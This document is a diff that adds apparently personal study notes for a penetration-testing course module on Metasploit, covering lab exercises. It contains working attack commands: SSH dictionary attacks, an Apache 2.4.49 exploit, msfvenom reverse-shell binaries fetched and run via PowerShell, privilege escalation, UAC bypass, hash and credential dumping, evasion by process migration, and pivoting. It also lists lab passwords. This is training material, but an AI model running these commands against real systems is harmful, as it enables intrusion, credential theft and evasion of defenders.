@@ -1,0 +1,415 @@
+Exploit & Post-exploitation frameworks
+- Metasploit
+	- by Rapid7
+- Covenant
+- Cobalt Strike
+	- commerical
+- PowerShell Empire
+
+# Getting Familiar with Metasploit
+
+### Setup and Work with MSF
+
+- Uses PostgreSQL
+- Initialize the MSF database
+	- `sudo msfdb init`
+	- To enable at boot time:
+		- `sudo systemctl enable postresql`
+- Connect to DB
+		- init db before launching MSFconsole to autoconnect
+	- `db_connect`
+- Launch **msfconsole**
+	- `sudo msfconsole`
+	- -q = quiet
+- verify database connection
+	- `db_status`
+- `help`
+- **workspaces**
+	- `workspace`
+	- `workspace -a pen200`
+		- creating a new workspace
+- Now, let's populate the database and get familiar with some of the _Database Backend Commands_.
+- **db_namp**
+	- wrapper to execute Nmap inside Metasploit and save the findings in the database
+	- `db_nmap -A 192.168.50.202```
+- **hosts**
+	- list of all discovered hosts up to this point
+	- `hosts`
+- **services**
+	- sisplay the discovered services from our port scan
+	- `services`
+	- filter for a specific port number
+		- `services -p 8000`
+- display the categories
+	- `show -h`
+- activate module
+	- `use`
+
+### Auxiliary Modules
+
+- list all auxiliary modules
+	- `show auxiliary`
+- Use **search** by filtering type
+	- `search type:auxiliary smb`
+	- `user 56`
+- Get information about the currently activated module
+	- `info`
+- display the options of a module
+	- `show options`
+- To display all required, but not yet set, options
+	- `show missing`
+- add or remove values from options
+	- `set`, `unset`, `setg`, `unsetg`
+- Set the value in an automated fashion by leveraging the results in the database
+	- Example: we can set _RHOSTS_ to all discovered hosts with open port 445
+		- `unset RHOSTS`
+		- `services -p 445 --rhosts`
+- launch module
+	- `run`
+	- `exploit`
+- Show if Metasploit automatically detected vulnerabilities based on the results of this module
+	- `vulns`
+- _Password Attacks_ Module
+		- Scenario:
+			- `we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra,2 we can also use Metasploit to perform this attack`
+	- To begin, we'll **search** for SSH auxiliary modules.
+		- ```search type:auxiliary ssh```
+		- `use 15`
+		- `show options`
+	- set options
+		- ```set PASS_FILE /usr/share/wordlists/rockyou.txt```
+		- ```set USERNAME george```
+		- ```set RHOSTS 192.168.50.201```
+		- ``` ```
+	- `run`
+	- opens a *session*
+- display all valid credentials we gathered up to this point
+	- `creds`
+
+### Exploit Modules
+
+- Example:
+	- Let's create a new workspace for this section and search Metasploit for modules related to "Apache 2.4.49"
+		- `workspace -a exploits`
+		- `search Apache 2.4.49`
+	- Let's **use** the exploit module and enter **info** to review its description.
+		- `use 0`
+		- `info`
+	- Display options
+		- `show options`
+	- Set payload
+		- ```set payload payload/linux/x64/shell_reverse_tcp```
+		- `show options`
+		- LPORT 4444 -> might be blocked by firewalls -> change LPORT to common http/https ports
+	- Set options
+		- `set SSL false`
+		- `set RPORT 80`
+		- ```set RHOSTS 192.168.50.16```
+	- `run`
+- *sessions*
+	- used to interact and manage access to successfully exploited targets
+- *jobs*
+	- used to run modules or features in the background.
+- Sessions
+	- send session to background
+		- `Ctrl + Z`
+	- list all sessions
+		- `sessions -l`
+	- interact with a session
+		- `sessions -i 2`
+		- `uname -a`
+	- kill a session
+		- `sessions -k 2`
+	- Run exploit in the context of a job
+		- `run -j`
+# Using Metasploit Payloads
+
+### Staged vs Non-Staged Payloads
+- `There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.`
+
+- List all payloads
+	- `show payloads`
+- **"/"**
+	- shell_reverse_tcp = not staged
+	- shell/reverse_tcp = staged
+### Meterpreter Payload
+	- dynamically extended at run-time
+	- payload resides entirely in memory on the target
+	- communication is encrypted by defaul
+	- All payloads are staged
+		- In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy.
+
+- Example:
+	- After selecting the 64-bit non-staged version of _meterpreter_reverse_tcp_ as payload, we can review its options
+	- `run`
+	- `help`
+	- start gathering information
+		- `sysinfo
+		- `getuid
+	- *channels*
+		- when interacting with a system within a session
+	- start interactive shell
+		- `shell`
+	- execute command in the context of a *channel*
+		- `id`
+	- Background the *channel*
+		- `Ctrl + Z`
+	- Start a second interactive shell, execute a command, and also, background the channel.
+		- `shell`
+		- `whoami`
+		- `Ctrl + z`
+	- List all active channels
+		- `channel -l`
+	- Interact with channel 1 again
+		- `channel -i 1`
+		- `id`
+	- Review commands
+		- `help`
+	- Use the _download_ and _upload_ commands from the category _File system Commands_ to transfer files to and from the system.
+		- change the local directory on our Kali machine to **/home/kali/Downloads**
+			- `lcd /home/kali/Downloads`
+		- Download **/etc/passwd** from the target machine to our Kali system.
+			- `download /etc/passwd`
+		- **cat** the file on local system
+			- `lcat /home/kali/Downloads/passwd`
+		- Upload *unix-privesc-check* tp **/tmp**
+			- ```upload /usr/bin/unix-privesc-check /tmp/```
+		- Check
+			- `ls /tmp`
+		- [Note:]
+			- [If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like "\\"]
+	- let's use another 64-bit Linux Meterpreter payload
+		- `exit`
+		- `show payloads`
+	- Use HTTPS connection meterpreter payload
+			- As the traffic itself is encrypted with SSL/TLS, defenders will only obtain information about HTTPS requests
+		- `set payload 10`
+		- `show options`
+		- `run`
+		- will seem like regular HTTPS traffic
+		- if they would check the address of the communication endpoint (our Kali machine in this example), they'd only get a _Not found_ page with HTTP code 404 in the browser.
+	- We should always attempt to obtain an initial foothold with a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies.
+### Executable Payloads
+
+*msfvenom*
+- Example:
+	- Create a malicious Windows binary starting a raw TCP reverse shell:
+		- listing all payloads with **payloads** as argument for **-l**. In addition, we use **--platform** to specify the platform for the payload and **--arch** for the architecture.
+			- `msfvenom -l payloads --platform windows --arch x64`
+	- use the **-p** flag to set the payload, set **LHOST** and **LPORT** to assign the host and port for the reverse connection, **-f** to set the output format (**exe** in this case), and **-o** to specify the output file name:
+		- ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe```
+	- Execute malicious binary file
+		- start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user _justin_ and password _SuperS3cure1337#_. Once we've connected over RDP, we can start PowerShell to transfer the file and execute it.
+			- [kali] `nc -lvnp 443`
+			- ```iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe```
+			- `.\nonstaged.exe`
+	- let's use a staged payload to do the same
+		- ```msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe ```
+	- [Netcat can't handle staged payloads]
+	- Use *mulit/handler*
+		- `use mulit/handler`
+	- Set *muli/handler* options to catch payload connection
+		- ```set payload windows/x64/shell/reverse_tcp```
+		- `show options`
+		- ```set LHOST 192.168.119.2```
+		- `set LPORT 443`
+		- `run`
+	- [For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat in order for the payload to work.]
+	- exit our session and restart the listener with **run -j**.
+		- `exit`
+		- `run -j`
+	- list the currently active jobs using **jobs**
+		- `jobs`
+	- As Metasploit created a new session for the incoming connection, we could now again interact with it with **sessions -i**
+
+# Performing Post-Exploitation with Metasploit
+
+### Core Meterpreter Post-Exploitation Features
+
+Example:
+`Let's assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system.`
+- Create a Windows rev shell exe binary
+	- ```msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.196 LPORT=443 -f exe -o met.exe```
+- Launch mulit/handler and set payload and options
+	- ```set payload windows/x64/meterpreter_reverse_https```
+	- `set LPORT 443`
+	- `run`
+- start Py server to serve **met.exe**.
+- Connect to bind shell
+	- ```nc 192.168.249.223 4444```
+- Download **met.exe**
+	- `powershell`
+	- ```iwr -uri http://192.168.45.205:8000/binary.exe -Outfile binary.exe```
+	- `.\met.exe`
+- Start exploring post-exploitation commands and features.
+	- **idletime**
+		- It displays the time for which a user has been idle.
+		- first commands as it indicates if the target machine is currently in use or not.
+	- **getsystem**
+		- Attempts to automatically elevate our permissions to _NT AUTHORITY\SYSTEM_.
+				- uses various techniques using named pipe impersonation and token duplication
+				- attempting to leverage _SeImpersonatePrivilege_[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/performing-post-exploitation-with-metasploit/core-meterpreter-post-exploitation-features#fn1) and _SeDebugPrivilege_.
+					- by using _Named Pipe Impersonation (PrintSpooler variant)_
+	- **shell**
+		- interactive shell
+		- `whoami /priv`
+			- Ex. user _luiza_ has _SeImpersonatePrivilege_ assigned
+		- Ex:
+			- **getuid**
+			- **getsystem**
+			- **getuid** 
+	- **migrate**
+		- move the execution of our Meterpreter payload to a different process
+			- so process doesnt get close or removed 
+		- can only migrate same (or lower) integrity and privilege level.
+		- Ex:
+			- `ps`
+			- `migrate 8052
+			- `getuid` -> new user (meterpreter running in the context of new process)
+	- **execute**
+		- creates a new process by specifying a command or program.
+		- Example: let's start a hidden Notepad process and migrate to it as user _offsec_
+			- ```execute -H -f notepad```
+				- -H = hidden process
+				- -f = specify command or program
+			- `migrate 2720`
+				- migrating to the newly spawned process
+	- **hashdump**
+		- dumps the contents of the SAM database
+	- **screenshare**
+		- displays the target machine's desktop in real-time.
+
+### Post- Exploitation Modules
+
+- Example:
+	- As before, we connect to the bind shell on port 4444 on ITWK01, download and execute **met.exe**, and enter **getsystem** to elevate our privileges. Then, we use **ps** to identify the process ID of _OneDrive.exe_, and **migrate** to it.
+		- `getsystem`
+		- `ps`
+		- `migrate 8044`
+		- `getuid`
+	- To display the integrity level of a process, we can use tools such as _Process Explorer_ or third-party PowerShell modules such as _NtObjectManager_.
+	- Once we import the module with _Import-Module_,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/performing-post-exploitation-with-metasploit/post-exploitation-modules#fn4) we can use _Get-NtTokenIntegrityLevel_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/performing-post-exploitation-with-metasploit/post-exploitation-modules#fn5) to display the integrity level of the current process by retrieving and reviewing the assigned access token.
+		- `shell`
+		- `powershell -ep bypass`
+		- ````Import-Module NtObjectManager```
+		- ```Get-NtTokenIntegrityLevel```
+	- Background the currently active channel and session
+		- `Ctrl + Z`
+		- `bg`
+	- search for UAC bypass modules
+		- `search UAC`
+	- Activate module and set options
+		- ```use exploit/windows/local/bypassuac_sdclt```
+		- `show options`
+		- `set session 9`
+		- `set LHOST 192.168.119.4`
+		- `run`
+	- Check integrity level 
+		- `shell`
+		- `powershell -ep bypass`
+		- `Import_Module NtObjectManager`
+		- `````Get-NtTokenIntegrityLevel```
+	- **load**
+		- loads extensions
+		- One great example of this is _Kiwi_, which is a Meterpreter extension providing the capabilities of _Mimikatz_. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute **met.exe** as user _luiza_ in the bind shell, and enter **getsystem**.
+			- ```use exploit/multi/handler```
+			- `run`
+			- `getsystem`
+		- *kiwi*
+			- `load kiki`
+			- `help`
+			- **creds_msv**
+				- `creds_msv
+					- retrieves NTLM hash
+- Turn shell into meterpreter shell
+	- `search shell_to_meterpreter`
+	- `use 0`
+	- set session
+	- run
+
+### Pivoting with Metasploit
+
+- Example:
+		- As in the previous sections, we'll connect to the bind shell on port 4444 on the machine ITWK01. Let's assume we are currently gathering information on the target. In this step, we'll identify a second network interface.
+	- `ipconfig`
+	- Listing 74 shows that the second interface has the assigned IP 172.16.5.199.
+	- Get meterpreter shell with **met.exe**
+	- `bg`
+	- **route add**
+		- To add a route to a network reachable through a compromised host
+		- ```route add 172.16.5.0/24 12```
+		- route add $ip $session
+	- **route print**
+	- scan ports
+		- ```use auxiliary/scanner/portscan/tcp ```
+		- ```set RHOSTS 172.16.5.200```
+		- ```set PORTS 445,3389```
+		- `run`
+	- SMB & RDP ports found
+	- Attempt to use *psexec*
+		- username is luiza
+		- password is _BoccieDearAeroMeow1!_.
+	- Let's use _exploit/windows/smb/psexec_ and set **SMBUser** to **luiza**, **SMBPass** to **BoccieDearAeroMeow1!**, and **RHOSTS** to **172.16.5.200**.
+	- [It's important to note that the added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as _windows/x64/meterpreter/bind_tcp_, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.]
+		- ```use exploit/windows/smb/psexec ```
+		- ```set SMBUser luiza```
+		- ```set SMBPass "BoccieDearAeroMeow1!"```
+		- ```set RHOSTS 172.16.5.200```
+		- ```set payload windows/x64/meterpreter/bind_tcp```
+		- `set LPORT 8000`
+		- `run`
+	- **route flush**
+		- removes manual routes
+	- **autoroute** module
+		- set up pivot routes through an existing Meterpreter session automatically
+		- ```use multi/manage/autoroute```
+		- `show options`
+		- `sessions -l`
+		- `set session 12`
+		- `run`
+	- **server/socks_proxy** auxiliary module to configure a SOCKS proxy
+		- pivot on port 1080 by default
+		- ```use auxiliary/server/socks_proxy```
+		- `show options`
+		- ```set SRVHOST 127.0.0.1```
+		- `set VERSION 5`
+		- `run -j`
+		- update *proxychains* config file
+			- ```socks5 127.0.0.1 1080```
+		- ```sudo proxychains xfreerdp /v:172.16.97.200 /u:luiza```
+	- use a similar technique for port forwarding using the **portfwd** command from inside a Meterpreter session, which will forward a specific port to the internal network.
+		- `sessions -i 12`
+		- `portfwd -h`
+	- We can create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)
+		- ```portfwd add -l 3389 -p 3389 -r 172.16.97.200```
+	- Test
+		- ```sudo xfreerdp /v:127.0.0.1 /u:luiza```
+
+### Resource Scripts
+- chain together a series of Metasploit console commands and Ruby code
+- Example:
+	- listener.rc
+		- ```use exploit/multi/handler
+			set PAYLOAD windows/meterpreter_reverse_https
+			set LHOST 192.168.119.4
+			set LPORT 443```
+	- _AutoRunScript_ option
+		- automatically execute a module after a session was created
+			- use the _post/windows/manage/migrate_ module. This will cause the spawned Meterpreter to automatically launch a background _notepad.exe_ process and migrate to it
+			- Automating process migration helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.
+		- ```set AutoRunScript post/windows/manage/migrate ```
+	- set _ExitOnSession_ to _false_
+		- ensure that the listener keeps accepting new connections after a session is created.
+		- ```set ExitOnSession false```
+	- **show advanced**
+		- We can also configure advanced options such as _ExitOnSession_ in multi/handler and _AutoRunScript_ in payloads by using **show advanced** within the activated module or selected payload.
+	- Run in background
+		- `run -z -j`
+	- Run script
+		- ```sudo msfconsole -r listener.rc```
+	- initial setup for example
+		- Let's connect to the BRUTE2 machine via RDP with user _justin_ and password _SuperS3cure1337#_, start PowerShell, download the malicious Windows executable **met.exe** that we already used in previous sections, and execute it.
+		- `iwr -uri http://192.168.119.4/met.exe -Outfile met.exe`
+		- `.\met.exe`
+- Already provided scripts in **scripts/resource** from Metasploit
+	- ```ls -l /usr/share/metasploit-framework/scripts/resource```
